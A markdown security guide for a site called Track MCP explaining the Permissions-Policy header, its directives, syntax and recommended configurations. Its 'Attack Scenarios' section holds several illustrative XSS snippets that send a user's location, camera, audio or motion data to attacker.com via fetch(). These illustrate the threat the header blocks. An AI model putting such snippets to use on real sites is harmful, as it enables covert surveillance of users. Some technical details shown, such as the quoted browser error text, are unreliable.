# Permissions-Policy Security Guide

## 📋 What is Permissions-Policy?

Permissions-Policy (formerly Feature-Policy) is an HTTP header that controls which browser features and APIs can be used on your site and in embedded content (iframes).

### Historical Context:
- **Original Name**: Feature-Policy (2018)
- **Current Name**: Permissions-Policy (2022)
- **Purpose**: Restrict powerful browser APIs
- **Status**: Active standard (W3C)

---

## 🔒 Current Configuration

### Recommended Value:
```
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()
```

### What It Does:
- ✅ Disables geolocation API
- ✅ Disables microphone access
- ✅ Disables camera access
- ✅ Disables Payment Request API
- ✅ Disables USB API
- ✅ Disables magnetometer sensor
- ✅ Disables gyroscope sensor
- ✅ Disables accelerometer sensor

### Why Disable All?
```
Track MCP doesn't need these features:
- No geolocation needed
- No camera/microphone needed
- No payment processing
- No USB access needed
- No sensor data needed

Disabling them:
✅ Reduces attack surface
✅ Prevents malicious scripts from accessing them
✅ Improves user privacy
✅ Follows principle of least privilege
```

---

## 🎯 Permissions-Policy Directives

### Complete List of Directives:

| Directive | Purpose | Default | Recommended |
|-----------|---------|---------|-------------|
| `accelerometer` | Motion sensor | Allow | Disable |
| `ambient-light-sensor` | Light sensor | Allow | Disable |
| `autoplay` | Auto-play media | Allow | Disable |
| `camera` | Camera access | Allow | Disable |
| `display-capture` | Screen capture | Allow | Disable |
| `document-domain` | Document.domain | Allow | Disable |
| `encrypted-media` | EME API | Allow | Disable |
| `fullscreen` | Fullscreen API | Allow | Allow (if needed) |
| `geolocation` | Geolocation API | Allow | Disable |
| `gyroscope` | Gyroscope sensor | Allow | Disable |
| `magnetometer` | Magnetometer sensor | Allow | Disable |
| `microphone` | Microphone access | Allow | Disable |
| `midi` | MIDI API | Allow | Disable |
| `payment` | Payment Request API | Allow | Disable |
| `picture-in-picture` | PiP video | Allow | Disable |
| `sync-xhr` | Synchronous XHR | Allow | Disable |
| `usb` | USB API | Allow | Disable |
| `vr` | WebVR API | Allow | Disable |
| `xr-spatial-tracking` | WebXR API | Allow | Disable |

---

## 🛡️ Attack Scenarios Prevented

### Scenario 1: Malicious Script Accesses Geolocation
```javascript
// Attacker injects this via XSS
navigator.geolocation.getCurrentPosition((pos) => {
  fetch('https://attacker.com/steal?lat=' + pos.coords.latitude)
})
```

**Without Permissions-Policy:**
- ❌ Script runs
- ❌ User location stolen
- ❌ Privacy violation

**With Permissions-Policy: geolocation=():**
- ✅ API blocked
- ✅ Script fails
- ✅ Location safe

### Scenario 2: Malicious Script Accesses Camera
```javascript
// Attacker injects this via XSS
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    // Stream camera to attacker
    fetch('https://attacker.com/stream', { body: stream })
  })
```

**Without Permissions-Policy:**
- ❌ Camera accessed
- ❌ Video streamed to attacker
- ❌ Privacy violation

**With Permissions-Policy: camera=():**
- ✅ API blocked
- ✅ Camera inaccessible
- ✅ Privacy protected

### Scenario 3: Malicious Script Accesses Microphone
```javascript
// Attacker injects this via XSS
navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    // Stream audio to attacker
    fetch('https://attacker.com/audio', { body: stream })
  })
```

**Without Permissions-Policy:**
- ❌ Microphone accessed
- ❌ Audio recorded and sent
- ❌ Privacy violation

**With Permissions-Policy: microphone=():**
- ✅ API blocked
- ✅ Microphone inaccessible
- ✅ Privacy protected

### Scenario 4: Malicious Script Accesses USB
```javascript
// Attacker injects this via XSS
navigator.usb.requestDevice({ filters: [] })
  .then(device => {
    // Access USB device
    device.open()
  })
```

**Without Permissions-Policy:**
- ❌ USB access granted
- ❌ Device compromised
- ❌ Security violation

**With Permissions-Policy: usb=():**
- ✅ API blocked
- ✅ USB inaccessible
- ✅ Device protected

### Scenario 5: Malicious Script Accesses Sensors
```javascript
// Attacker injects this via XSS
window.addEventListener('devicemotion', (event) => {
  // Capture accelerometer data
  const accel = event.acceleration
  fetch('https://attacker.com/motion?x=' + accel.x)
})
```

**Without Permissions-Policy:**
- ❌ Sensor data captured
- ❌ Motion patterns tracked
- ❌ Privacy violation

**With Permissions-Policy: accelerometer=(), gyroscope=(), magnetometer=():**
- ✅ Sensors blocked
- ✅ Data inaccessible
- ✅ Privacy protected

---

## 📊 Permissions-Policy Syntax

### Deny All (Most Restrictive):
```
Permissions-Policy: geolocation=()
```
- `()` = empty list = deny all

### Allow Self Only:
```
Permissions-Policy: geolocation=(self)
```
- `(self)` = allow same-origin only

### Allow Specific Origins:
```
Permissions-Policy: geolocation=(self "https://trusted.com")
```
- Allow self and specific origin

### Allow All (Least Restrictive):
```
Permissions-Policy: geolocation=*
```
- `*` = allow all origins
- ⚠️ Not recommended

---

## 🔧 Implementation Details

### Current Configuration:
```typescript
// middleware.ts
response.headers.append(
  'Permissions-Policy',
  'geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()'
)
```

### Applied To:
- ✅ All HTTP responses
- ✅ All pages
- ✅ All iframes
- ✅ All embedded content

### Behavior:

#### Disabled API:
```javascript
// User tries to access geolocation
navigator.geolocation.getCurrentPosition(...)

// Result:
// Error: Permissions-Policy: geolocation is not allowed
```

#### Allowed API:
```javascript
// If we enabled fullscreen
navigator.requestFullscreen()

// Result:
// ✅ Works (if we allowed it)
```

---

## 🎯 Use Cases by Feature

### Geolocation
```
Use case: Track user location
Track MCP needs: NO
Recommendation: Disable ✅

Permissions-Policy: geolocation=()
```

### Camera
```
Use case: Video calls, streaming
Track MCP needs: NO
Recommendation: Disable ✅

Permissions-Policy: camera=()
```

### Microphone
```
Use case: Audio calls, voice input
Track MCP needs: NO
Recommendation: Disable ✅

Permissions-Policy: microphone=()
```

### Payment
```
Use case: Payment Request API
Track MCP needs: NO (not an e-commerce site)
Recommendation: Disable ✅

Permissions-Policy: payment=()
```

### USB
```
Use case: USB device access
Track MCP needs: NO
Recommendation: Disable ✅

Permissions-Policy: usb=()
```

### Sensors (Accelerometer, Gyroscope, Magnetometer)
```
Use case: Motion/orientation tracking
Track MCP needs: NO
Recommendation: Disable ✅

Permissions-Policy: accelerometer=(), gyroscope=(), magnetometer=()
```

### Fullscreen
```
Use case: Fullscreen video/content
Track MCP needs: Maybe (for embedded videos)
Recommendation: Allow or Disable based on needs

Permissions-Policy: fullscreen=(self)
```

---

## 🔍 Testing & Verification

### Check Header:
```bash
curl -I https://www.trackmcp.com | grep Permissions-Policy
# Should output:
# Permissions-Policy: geolocation=(), microphone=(), camera=(), ...
```

### Browser DevTools:
1. Open DevTools (F12)
2. Go to Network tab
3. Click any response
4. Check Headers section
5. Should see: `Permissions-Policy: geolocation=(), ...`

### Test Blocked API:
```javascript
// Open console on trackmcp.com
navigator.geolocation.getCurrentPosition(
  (pos) => console.log('Got location:', pos),
  (err) => console.error('Error:', err)
)

// Should see error:
// Error: Permissions-Policy: geolocation is not allowed
```

### Online Tools:
- **Security Headers**: https://securityheaders.com/
- **Mozilla Observatory**: https://observatory.mozilla.org/

---

## 📈 Browser Support

| Browser | Support | Notes |
|---------|---------|-------|
| Chrome | ✅ Yes | Full support |
| Firefox | ✅ Yes | Full support |
| Safari | ✅ Yes | Full support |
| Edge | ✅ Yes | Full support |
| IE 11 | ❌ No | Not supported |

**Compatibility**: 95%+ (all modern browsers)

---

## ✅ Implementation Checklist

### Current Status (✅ Complete):
- ✅ Geolocation disabled
- ✅ Microphone disabled
- ✅ Camera disabled
- ✅ Payment API disabled
- ✅ USB API disabled
- ✅ Magnetometer disabled
- ✅ Gyroscope disabled
- ✅ Accelerometer disabled
- ✅ Applied globally via middleware

### Verification:
- [ ] Check header with curl
- [ ] Test blocked APIs in console
- [ ] Use online security scanner
- [ ] Monitor for API access attempts

### For Future Needs:
- [ ] If you need fullscreen, enable it
- [ ] If you add video calls, enable camera/microphone
- [ ] If you add payment, enable payment API
- [ ] Test thoroughly before enabling

---

## 🚀 Defense-in-Depth Strategy

### Layer 1: Permissions-Policy
```
Permissions-Policy: geolocation=(), camera=(), ...
```
Disable all unnecessary APIs.

### Layer 2: Content-Security-Policy
```
script-src 'self'
```
Prevent malicious scripts from loading.

### Layer 3: X-Frame-Options
```
X-Frame-Options: DENY
```
Prevent framing attacks.

### Layer 4: Input Validation
```javascript
// Validate all user input
// Sanitize before storing
```

### Layer 5: Runtime Monitoring
```javascript
// Monitor for API access attempts
// Log suspicious activity
```

---

## 💡 Principle of Least Privilege

### What It Means:
```
Grant only the minimum permissions needed
Deny everything else by default
```

### Applied to Permissions-Policy:
```
Track MCP needs:
- Search functionality ✅
- Display results ✅
- Navigation ✅

Track MCP doesn't need:
- Geolocation ❌
- Camera ❌
- Microphone ❌
- USB ❌
- Sensors ❌

Result: Disable all unnecessary APIs
```

---

## 📝 Common Issues & Solutions

### Issue 1: "API is not allowed" Error
```
Error: Permissions-Policy: geolocation is not allowed
```

**Solution:**
- This is expected (API is disabled)
- If you need the API, enable it in Permissions-Policy
- Update middleware.ts
- Test thoroughly

### Issue 2: Embedded Content Can't Access API
```
Problem: Iframe can't access geolocation
Cause: Permissions-Policy: geolocation=()
Solution: Allow specific origins if needed
```

### Issue 3: Third-party Script Needs API
```
Problem: Analytics script needs geolocation
Cause: Permissions-Policy: geolocation=()
Solution: Either:
1. Find alternative that doesn't need it
2. Enable geolocation for that origin
3. Use different analytics provider
```

---

## 🔗 Related Headers

### Permissions-Policy + CSP:
```
Permissions-Policy: geolocation=(), camera=()
Content-Security-Policy: script-src 'self'
```

### Permissions-Policy + X-Frame-Options:
```
Permissions-Policy: geolocation=(), camera=()
X-Frame-Options: DENY
```

### Permissions-Policy + Referrer-Policy:
```
Permissions-Policy: geolocation=(), camera=()
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 🎯 Recommended Permissions-Policy

### For General Sites (Like Track MCP):
```
Permissions-Policy: 
  geolocation=(),
  microphone=(),
  camera=(),
  payment=(),
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=(),
  ambient-light-sensor=(),
  autoplay=(),
  display-capture=(),
  encrypted-media=(),
  fullscreen=(self),
  midi=(),
  picture-in-picture=(self),
  sync-xhr=(),
  vr=(),
  xr-spatial-tracking=()
```

### For E-Commerce Sites:
```
Permissions-Policy:
  geolocation=(),
  microphone=(),
  camera=(),
  payment=(self),  # Allow payment API
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=()
```

### For Video Conferencing:
```
Permissions-Policy:
  geolocation=(),
  microphone=(self),  # Allow microphone
  camera=(self),      # Allow camera
  payment=(),
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=()
```

### For Location-Based Services:
```
Permissions-Policy:
  geolocation=(self),  # Allow geolocation
  microphone=(),
  camera=(),
  payment=(),
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=()
```

---

## 📊 Security Impact

### Without Permissions-Policy:
```
Malicious script via XSS:
→ Can access geolocation
→ Can access camera
→ Can access microphone
→ Can access USB
→ Can access sensors
→ Privacy violation ❌
```

### With Permissions-Policy:
```
Malicious script via XSS:
→ Cannot access geolocation
→ Cannot access camera
→ Cannot access microphone
→ Cannot access USB
→ Cannot access sensors
→ Privacy protected ✅
```

---

## 🔗 Related Resources

- [MDN: Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy)
- [W3C: Permissions-Policy](https://w3c.github.io/webappsec-permissions-policy/)
- [OWASP: Permissions-Policy](https://owasp.org/www-project-secure-headers/#permissions-policy)
- [Security Headers](https://securityheaders.com/)

---

## 🎯 Current Status

### ✅ Track MCP Implementation:
- ✅ Permissions-Policy enabled
- ✅ All dangerous APIs disabled
- ✅ Principle of least privilege applied
- ✅ Applied globally via middleware
- ✅ 95%+ browser compatibility
- ✅ Maximum privacy protection

**Your site has comprehensive API access control!** 🔒

